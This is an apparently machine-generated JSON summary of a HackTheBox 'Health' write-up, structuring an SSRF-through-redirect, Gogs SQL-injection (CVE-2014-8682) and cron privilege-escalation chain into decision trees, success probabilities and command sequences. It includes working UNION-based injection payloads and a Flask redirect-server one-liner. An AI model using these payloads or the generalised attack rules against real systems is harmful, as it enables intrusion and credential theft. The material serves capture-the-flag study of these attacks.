{
  "writeup_id": "Htb_Health",
  "scenario_fingerprint": {
    "scenario_name": "linux_web_ssrf_sqli_redirect",
    "primary_services": [
      "http",
      "ssh"
    ],
    "port_signature": "22+80+3000",
    "service_combination": "ssh+apache+filtered_service",
    "os_family": "ubuntu_linux",
    "environment_type": "web_application",
    "entry_vector": "ssrf_redirect_sqli",
    "privilege_path": "web_user_to_root",
    "attack_complexity": "medium",
    "estimated_time": "90-120 minutes",
    "scenario_confidence": 0.88,
    "distinguishing_factors": [
      "webhook_monitoring_service",
      "laravel_php_framework",
      "redirect_based_sqli",
      "filtered_port_3000"
    ],
    "environmental_clues": [
      "http_monitoring_tool_interface",
      "laravel_session_cookies",
      "webhook_payload_functionality",
      "url_filtering_bypass_needed"
    ],
    "similar_scenarios": [
      "ssrf_webhook_exploitation",
      "laravel_web_apps"
    ],
    "unique_aspects": [
      "ssrf_via_redirect_to_bypass_sqlmap",
      "gogs_service_exploitation",
      "database_task_injection_for_privesc",
      "cron_exploitation_via_direct_db_access"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "SSRF_via_redirect",
        "success_reason": "Health monitoring service followed redirects without validating final destination",
        "prerequisite_indicators": [
          "web_service_makes_outbound_requests",
          "redirect_following_enabled",
          "insufficient_url_validation"
        ],
        "recognition_patterns": [
          "webhook/monitoring functionality",
          "URL validation only on initial input",
          "HTTP client follows 30x redirects",
          "filtered ports accessible internally"
        ],
        "failure_modes": [
          "redirect_following_disabled",
          "comprehensive_url_validation",
          "network_segmentation_blocks_internal_access"
        ],
        "environmental_factors": [
          "internal_services_on_filtered_ports",
          "weak_input_validation",
          "default_http_client_behavior"
        ],
        "success_probability": 0.75,
        "typical_timeframe": "15-30 minutes"
      },
      {
        "technique": "SQL_injection_via_SSRF",
        "success_reason": "Gogs service vulnerable to SQL injection in webhook functionality",
        "prerequisite_indicators": [
          "internal_web_service_accessible",
          "webhook_functionality_present",
          "insufficient_input_sanitization"
        ],
        "recognition_patterns": [
          "Gogs service on port 3000",
          "webhook endpoints accept user input",
          "SQL error messages in responses",
          "time-based injection possible"
        ],
        "failure_modes": [
          "parameterized_queries_used",
          "input_validation_present",
          "service_not_accessible_via_ssrf"
        ],
        "environmental_factors": [
          "legacy_gogs_version",
          "default_configurations",
          "internal_service_assumptions"
        ],
        "success_probability": 0.65,
        "typical_timeframe": "45-90 minutes"
      },
      {
        "technique": "database_task_injection",
        "success_reason": "Cron job executed tasks from database without proper validation",
        "prerequisite_indicators": [
          "database_access_available",
          "cron_jobs_process_db_data",
          "insufficient_command_validation"
        ],
        "recognition_patterns": [
          "scheduled tasks in database",
          "cron processes web application data",
          "direct database write access",
          "command execution via task system"
        ],
        "failure_modes": [
          "proper_input_validation",
          "sandboxed_task_execution",
          "no_database_write_access"
        ],
        "environmental_factors": [
          "shared_database_between_services",
          "privileged_cron_execution",
          "insufficient_separation_of_concerns"
        ],
        "success_probability": 0.8,
        "typical_timeframe": "20-40 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "filtered_port_3000_gogs_service",
        "discovery_method": "SSRF via redirect bypass",
        "why_critical": "Exposed internal Gogs service with SQL injection vulnerability",
        "how_to_recognize": [
          "nmap shows filtered ports",
          "redirect following in HTTP clients",
          "internal service fingerprinting"
        ],
        "follow_up_actions": [
          "enumerate_gogs_functionality",
          "test_sql_injection_points",
          "extract_user_credentials"
        ]
      },
      {
        "discovery": "user_hash_from_gogs_database",
        "discovery_method": "SQL injection via SSRF redirect",
        "why_critical": "Provided SSH access after hash cracking",
        "how_to_recognize": [
          "bcrypt hash format",
          "user table enumeration",
          "credential reuse patterns"
        ],
        "follow_up_actions": [
          "crack_hash_with_hashcat",
          "test_ssh_access",
          "enumerate_user_privileges"
        ]
      },
      {
        "discovery": "cron_processes_database_tasks",
        "discovery_method": "Process enumeration and database analysis",
        "why_critical": "Allowed privilege escalation to root via task injection",
        "how_to_recognize": [
          "cron jobs in process list",
          "database task tables",
          "web application task scheduling"
        ],
        "follow_up_actions": [
          "analyze_task_execution_flow",
          "inject_malicious_tasks",
          "bypass_web_filtering"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "user_susanne",
        "escalation_method": "database_task_injection",
        "why_possible": "Cron job executed database tasks as root without validation",
        "recognition_signs": [
          "database_write_access",
          "cron_processes_tasks",
          "insufficient_command_validation",
          "shared_database_architecture"
        ],
        "exploitation_path": "Database access → Task injection → Root cron execution"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found ports 22,80 open and 3000 filtered on Linux host",
        "decision": "Enumerate web application for SSRF potential",
        "reasoning": "Filtered port suggests internal service accessible via SSRF",
        "confidence": 0.8,
        "alternatives": [
          {
            "option": "direct_web_exploitation",
            "when": "if no SSRF found"
          },
          {
            "option": "ssh_bruteforce",
            "when": "if web fails"
          }
        ],
        "success_indicators": [
          "webhook_functionality_found",
          "http_requests_made_by_server",
          "redirect_following_confirmed"
        ],
        "next_decision": "test_ssrf_capabilities"
      },
      {
        "step": 2,
        "situation": "Webhook monitoring service accepts external URLs",
        "decision": "Test for SSRF via redirect bypass",
        "reasoning": "Service blocks direct localhost/internal IPs but may follow redirects",
        "confidence": 0.9,
        "prerequisites": [
          "webhook_service_identified",
          "external_server_control"
        ],
        "success_indicators": [
          "redirect_followed",
          "internal_content_leaked"
        ],
        "failure_fallbacks": [
          "direct_parameter_manipulation",
          "header_injection"
        ]
      },
      {
        "step": 3,
        "situation": "SSRF confirmed via redirect, filtered port 3000 accessible",
        "decision": "Enumerate internal service on port 3000",
        "reasoning": "Filtered ports often contain sensitive internal applications",
        "confidence": 0.95,
        "prerequisites": [
          "ssrf_working",
          "redirect_server_setup"
        ],
        "success_indicators": [
          "internal_service_identified",
          "authentication_pages_found"
        ],
        "next_decision": "exploit_internal_service"
      },
      {
        "step": 4,
        "situation": "Internal service discovered (likely Gogs based on context)",
        "decision": "Look for SQL injection in internal application",
        "reasoning": "Internal services often have weaker security controls",
        "confidence": 0.7,
        "prerequisites": [
          "internal_service_access",
          "application_endpoints_mapped"
        ],
        "success_indicators": [
          "sql_error_messages",
          "data_extraction_successful"
        ],
        "failure_fallbacks": [
          "credential_bruteforce",
          "default_credentials",
          "version_specific_exploits"
        ]
      }
    ],
    "branching_logic": {
      "if_ssrf_confirmed": {
        "action": "enumerate_internal_services",
        "tools": [
          "custom_redirect_server",
          "burp_collaborator"
        ],
        "next_phase": "internal_service_exploitation"
      },
      "if_internal_service_found": {
        "action": "test_for_injection_vulnerabilities",
        "alternatives": [
          "sql_injection",
          "command_injection",
          "file_inclusion"
        ],
        "decision_criteria": "based_on_application_type_and_parameters"
      },
      "if_credentials_extracted": {
        "action": "test_credential_reuse",
        "targets": [
          "ssh_service",
          "web_application",
          "other_discovered_services"
        ],
        "tools": [
          "hydra",
          "ssh_direct_login"
        ]
      },
      "if_ssh_access_obtained": {
        "action": "enumerate_privilege_escalation",
        "tools": [
          "linpeas",
          "pspy",
          "manual_enumeration"
        ],
        "focus": [
          "cron_jobs",
          "suid_binaries",
          "writable_services"
        ]
      }
    },
    "optimization_rules": [
      {
        "rule": "always_test_redirect_bypass_for_ssrf",
        "reasoning": "common_bypass_technique_for_ip_filtering",
        "applicability": "webhook_or_url_fetching_services"
      },
      {
        "rule": "prioritize_filtered_ports_via_ssrf",
        "reasoning": "filtered_ports_often_contain_sensitive_internal_services",
        "applicability": "ssrf_vulnerability_confirmed"
      },
      {
        "rule": "test_sql_injection_on_internal_services",
        "reasoning": "internal_services_often_have_weaker_input_validation",
        "applicability": "internal_web_application_discovered"
      },
      {
        "rule": "check_credential_reuse_across_all_services",
        "reasoning": "users_often_reuse_passwords_across_systems",
        "applicability": "any_credentials_obtained"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "SSRF_via_webhook",
        "mitre_id": "T1190",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "webhook_functionality_present",
          "url_input_fields",
          "server_makes_outbound_requests"
        ],
        "success_indicators": [
          "outbound_requests_observed",
          "url_validation_bypassable",
          "internal_services_accessible"
        ],
        "incompatible_with": [
          "strict_url_validation",
          "network_egress_filtering",
          "no_outbound_connectivity"
        ],
        "confidence_boosters": [
          "monitoring_service_detected",
          "webhook_test_functionality",
          "filtered_internal_ports_detected"
        ],
        "typical_success_rate": 0.75,
        "estimated_time": "10-30 minutes"
      },
      {
        "technique": "SQL_injection_via_redirect",
        "mitre_id": "T1190",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "web_application_present",
          "redirect_functionality",
          "database_backend",
          "parameter_processing_via_redirect"
        ],
        "success_indicators": [
          "redirect_responses_observed",
          "database_errors_in_responses",
          "parameter_reflection_detected"
        ],
        "incompatible_with": [
          "input_sanitization_enabled",
          "prepared_statements_only",
          "no_redirect_functionality"
        ],
        "confidence_boosters": [
          "laravel_framework_detected",
          "complex_redirect_chains",
          "parameter_based_redirects"
        ],
        "typical_success_rate": 0.45,
        "estimated_time": "30-90 minutes"
      },
      {
        "technique": "cron_job_exploitation",
        "mitre_id": "T1053.003",
        "required_services": [
          "ssh",
          "http"
        ],
        "required_ports": [
          22,
          80,
          443
        ],
        "os_requirements": [
          "linux"
        ],
        "environmental_prerequisites": [
          "cron_service_running",
          "web_application_database_access",
          "scheduled_task_execution",
          "database_write_permissions"
        ],
        "success_indicators": [
          "cron_jobs_identified",
          "database_write_access_confirmed",
          "scheduled_execution_observed"
        ],
        "incompatible_with": [
          "no_cron_service",
          "read_only_database_access",
          "strict_input_validation"
        ],
        "confidence_boosters": [
          "web_app_database_integration",
          "task_scheduling_functionality",
          "automated_processing_detected"
        ],
        "typical_success_rate": 0.65,
        "estimated_time": "20-45 minutes"
      }
    ],
    "environmental_detectors": {
      "laravel_application": {
        "port_indicators": [
          80,
          443,
          8080
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "banner_indicators": [
          "laravel_session",
          "XSRF-TOKEN",
          "Apache"
        ],
        "confidence_threshold": 0.9
      },
      "webhook_service": {
        "port_indicators": [
          80,
          443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "technology_indicators": [
          "webhook",
          "monitoring",
          "health check"
        ],
        "confidence_threshold": 0.85
      },
      "filtered_internal_services": {
        "port_indicators": [
          3000
        ],
        "service_indicators": [
          "filtered"
        ],
        "banner_indicators": [
          "ppp",
          "filtered"
        ],
        "confidence_threshold": 0.75
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "ssrf_via_webhook",
          "when": "webhook_functionality_detected",
          "reason": "direct_path_to_internal_service_access"
        },
        {
          "attack": "internal_service_enumeration",
          "when": "filtered_ports_detected",
          "reason": "likely_internal_services_accessible_via_ssrf"
        }
      ],
      "medium_priority": [
        {
          "attack": "sql_injection_via_redirect",
          "when": "laravel_application_detected",
          "reason": "complex_but_high_impact_if_successful"
        },
        {
          "attack": "cron_exploitation",
          "when": "database_access_achieved",
          "reason": "reliable_privilege_escalation_method"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "SSRF via Redirect",
        "mitre_id": "T1190",
        "category": "initial_access",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "Flask",
            "command_template": "python3 redirect_server.py",
            "actual_command": "flask run --host=0.0.0.0 --port=80",
            "output_pattern": "302 redirect followed by target response",
            "effectiveness_rating": 5,
            "reliability": 0.95
          }
        ],
        "prerequisites": [
          "webhook_functionality_available",
          "redirect_following_enabled",
          "internal_network_access"
        ],
        "success_indicators": [
          "redirect_followed_successfully",
          "internal_service_response_received",
          "filtered_ports_accessible"
        ],
        "common_failures": [
          "redirect_not_followed",
          "internal_network_blocked",
          "webhook_filtering_too_strict"
        ],
        "follow_up_techniques": [
          "sql_injection_via_ssrf",
          "internal_service_enumeration",
          "credential_extraction"
        ],
        "time_investment": "10-20 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "SQL Injection via SSRF",
        "mitre_id": "T1190",
        "category": "initial_access",
        "phase": "exploitation",
        "tools_used": [
          {
            "name": "Custom Flask Server",
            "command_template": "redirect to http://127.0.0.1:3000/api/v1/users/search?q={payload}",
            "actual_command": "redirect('http://127.0.0.1:3000/api/v1/users/search?q=\\')/**/union/**/all/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--/**/-')",
            "output_pattern": "{\"data\":[{\"username\":\"extracted_data\",\"avatar\":\"//1.gravatar.com/avatar/\"}],\"ok\":true}",
            "effectiveness_rating": 4,
            "reliability": 0.85
          }
        ],
        "prerequisites": [
          "gogs_version_0.5.5_or_vulnerable",
          "ssrf_access_to_internal_gogs",
          "union_injection_possible"
        ],
        "success_indicators": [
          "union_query_executes_successfully",
          "data_extracted_in_json_response",
          "database_schema_enumerated"
        ],
        "common_failures": [
          "column_count_mismatch",
          "sql_syntax_errors",
          "waf_blocking_payloads"
        ],
        "follow_up_techniques": [
          "password_hash_extraction",
          "database_enumeration",
          "credential_cracking"
        ],
        "time_investment": "30-60 minutes",
        "skill_level": "advanced"
      },
      {
        "name": "Gogs CVE-2014-8682 Exploitation",
        "mitre_id": "T1190",
        "category": "initial_access",
        "phase": "exploitation",
        "tools_used": [
          {
            "name": "Manual SQL Injection",
            "command_template": "/api/v1/users/search?q=')/**/union/**/all/**/select/**/[columns]--/**/-",
            "actual_command": "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,sqlite_version(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--/**/-",
            "output_pattern": "JSON response with injected data in username field",
            "effectiveness_rating": 5,
            "reliability": 0.9
          }
        ],
        "prerequisites": [
          "gogs_version_0.5.5",
          "api_endpoint_accessible",
          "sqlite_database_backend"
        ],
        "success_indicators": [
          "version_information_extracted",
          "user_table_accessible",
          "password_hashes_retrieved"
        ],
        "common_failures": [
          "incorrect_column_count",
          "database_type_mismatch",
          "api_endpoint_blocked"
        ],
        "follow_up_techniques": [
          "hash_cracking",
          "ssh_authentication",
          "privilege_escalation"
        ],
        "time_investment": "20-45 minutes",
        "skill_level": "intermediate"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "Flask Redirect Server",
        "use_case": "ssrf_bypass_via_redirect",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "ssrf_exploitation",
          "internal_network_access"
        ],
        "alternatives": [
          "burp_collaborator",
          "custom_http_server"
        ],
        "best_practices": [
          "use_127.0.0.1_for_localhost_bypass",
          "test_redirect_following_first",
          "capture_full_response_body"
        ]
      },
      {
        "tool": "Manual SQL Injection",
        "use_case": "gogs_cve_2014_8682_exploitation",
        "effectiveness_rating": 4,
        "reliability": 0.85,
        "learning_curve": "medium",
        "essential_for": [
          "gogs_exploitation",
          "database_extraction"
        ],
        "alternatives": [
          "sqlmap_with_custom_requests",
          "automated_injection_tools"
        ],
        "best_practices": [
          "determine_column_count_first",
          "identify_database_type_early",
          "use_comment_syntax_for_payload_termination"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "ssrf_to_sql_injection_chain",
        "steps": [
          {
            "step": 1,
            "command": "python3 -c \"from flask import Flask, redirect; app = Flask(__name__); @app.route('/redirect') def r(): return redirect('http://127.0.0.1:3000'); app.run(host='0.0.0.0', port=80)\"",
            "purpose": "Setup redirect server for SSRF bypass",
            "expected_output": "Flask server running on port 80"
          },
          {
            "step": 2,
            "command": "Submit webhook with monitored URL: http://[attacker_ip]/redirect",
            "purpose": "Trigger SSRF via webhook functionality",
            "expected_output": "Gogs HTML response in webhook POST"
          },
          {
            "step": 3,
            "command": "Update redirect to: http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--/**/-",
            "purpose": "Test SQL injection column count",
            "expected_output": "JSON with username field showing injected data"
          },
          {
            "step": 4,
            "command": "Update payload to extract sqlite_version()",
            "purpose": "Confirm database type and injection success",
            "expected_output": "SQLite version in JSON response"
          }
        ],
        "success_rate": 0.8,
        "typical_duration": "45-90 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Health",
      "difficulty": "Medium",
      "os": "Ubuntu 18.04",
      "platform": "HackTheBox",
      "release_date": "2022-08-20",
      "author": "irogir",
      "estimated_time": "2-3 hours"
    },
    "intelligence_metadata": {
      "attack_complexity": "medium",
      "skill_level_required": "intermediate",
      "primary_attack_vectors": [
        "ssrf",
        "sql_injection",
        "cron_exploitation"
      ],
      "key_vulnerabilities": [
        "redirect_based_sqli",
        "database_manipulation",
        "task_injection"
      ],
      "environment_type": "web_application_server",
      "real_world_relevance": "high",
      "learning_value": [
        "advanced_sqli_techniques",
        "ssrf_chaining",
        "database_direct_manipulation"
      ],
      "prerequisite_knowledge": [
        "sql_injection",
        "ssrf_concepts",
        "linux_cron",
        "hash_cracking"
      ]
    },
    "categorization": {
      "primary_category": "web_exploitation",
      "subcategories": [
        "sql_injection",
        "ssrf",
        "privilege_escalation"
      ],
      "attack_types": [
        "initial_access",
        "credential_access",
        "privilege_escalation"
      ],
      "defensive_lessons": [
        "input_validation",
        "redirect_restrictions",
        "cron_security",
        "database_permissions"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Bolt",
        "Previse",
        "Writer"
      ],
      "similarity_reasons": [
        "complex_sqli",
        "web_app_exploitation",
        "database_manipulation"
      ],
      "unique_aspects": [
        "redirect_based_injection",
        "gogs_exploitation",
        "direct_database_task_creation"
      ],
      "difficulty_factors": [
        "chained_vulnerabilities",
        "manual_exploitation_required",
        "bypassing_web_filters"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-05T00:51:22.446632",
    "original_file": "0xdf_writeups/Htb Health.md",
    "content_length": 38398,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 1.0,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 1.0,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}